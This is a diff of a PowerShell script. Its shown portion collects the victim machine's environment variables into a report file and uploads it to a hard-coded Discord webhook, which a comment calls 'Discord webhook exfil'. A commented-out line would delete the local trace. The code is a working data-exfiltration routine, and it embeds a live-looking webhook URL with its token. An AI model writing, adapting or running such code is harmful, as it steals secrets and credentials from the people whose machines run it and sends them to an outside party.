@@ -102,22 +102,20 @@ Get-ChildItem Env: | Format-Table Name,Value -AutoSize | Out-String | Add-Conten
 
 # Discord webhook exfil
 $WEBHOOK_URL = "https://discord.com/api/webhooks/1478994129508892672/lA7G6TFM417kohIT57ztdQP1N6imbX9HwhTIbYQiKzvX3nJSSVl4UcJF0fVIEe8HN_ZE"
-# Send the report as a file to Discord
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# Build multipart/form-data body
 $boundary = [System.Guid]::NewGuid().ToString()
 $LF = "`r`n"
-
-# Build multipart/form-data body
 $bodyLines = @()
 $bodyLines += "--$boundary$LF"
 $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"result.txt`"$LF"
 $bodyLines += "Content-Type: text/plain$LF$LF"
 $bodyLines += Get-Content $OUTPUT -Raw
 $bodyLines += "$LF--$boundary--$LF"
-
 $body = $bodyLines -join ""
 
+# Send the file
 Invoke-WebRequest -Uri $WEBHOOK_URL -Method POST -Body $body -ContentType "multipart/form-data; boundary=$boundary" -UseBasicParsing
 # Clean up (uncomment to delete local file)
 # Remove-Item $OUTPUT -Force
